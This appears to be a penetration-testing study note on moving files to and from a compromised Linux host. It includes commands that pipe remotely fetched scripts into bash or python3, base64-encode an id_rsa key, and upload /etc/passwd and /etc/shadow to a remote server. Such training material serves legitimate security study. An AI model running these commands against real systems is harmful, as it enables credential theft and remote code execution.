---
title: Linux File Transer
tags: [download, upload, wget, curl, base64]
tools: ['ftp', 'openssl', 'python']
notes: "Various file transfer techniques for Linux"
---
# Linux File Transfer

## Download Operations

### Base64 Encoding / Decoding

**Check MD5 and Encode/Decode:**

```bash
# Check MD5 and encode
md5sum id_rsa
4e301756a07ded0a2dd6953abf015278  id_rsa

cat id_rsa |base64 -w 0;echo
---SNIP---

# Decode and check MD5
echo -n '---SNIP---' | base64 -d > id_rsa

md5sum id_rsa
4e301756a07ded0a2dd6953abf015278  id_rsa
```

---

### cURL / wget

Some payloads such as `mkfifo` write files to disk. Keep in  mind that while the execution of the payload may be fileless when you  use a pipe, depending on the payload chosen it may create temporary  files on the OS.

```bash
# Standard
wget https://host/LinEnum.sh -O /tmp/LinEnum.sh
curl -o /tmp/LinEnum.sh https://host/LinEnum.sh

# Fileless
curl https://host/LinEnum.sh | bash
wget -qO- https://host/script.py | python3
```

---

### Download with Bash (/dev/tcp)

**Connect to the Target Webserver**:

```bash
# Connect
exec 3<>/dev/tcp/10.10.10.32/80

# HTTP GET request
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3

# Print response
cat <&3
```

---

### Downloading Files Using SCP

`scp plaintext@192.168.1.10:/root/myroot.txt . `

---

## Upload Operations

### Web Upload

**Python upload server:**

```bash
# Create cert
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

# Start server
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

# Upload file
curl -X POST https://192.168.1.10/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

---

### Alternative Web File Transfer Method

It is possible to stand up a web server using various languages. A  compromised Linux machine may not have a web server installed. In such  cases, we can use a mini web server. 

```bash
# Python3
python3 -m http.server

# python2
python2.7 -m SimpleHTTPServer

# PHP
php -S 0.0.0.0:8000

# Ruby
ruby -run -ehttpd . -p8000

# SCP
scp /etc/passwd user@192.168.1.10:/tmp/
```
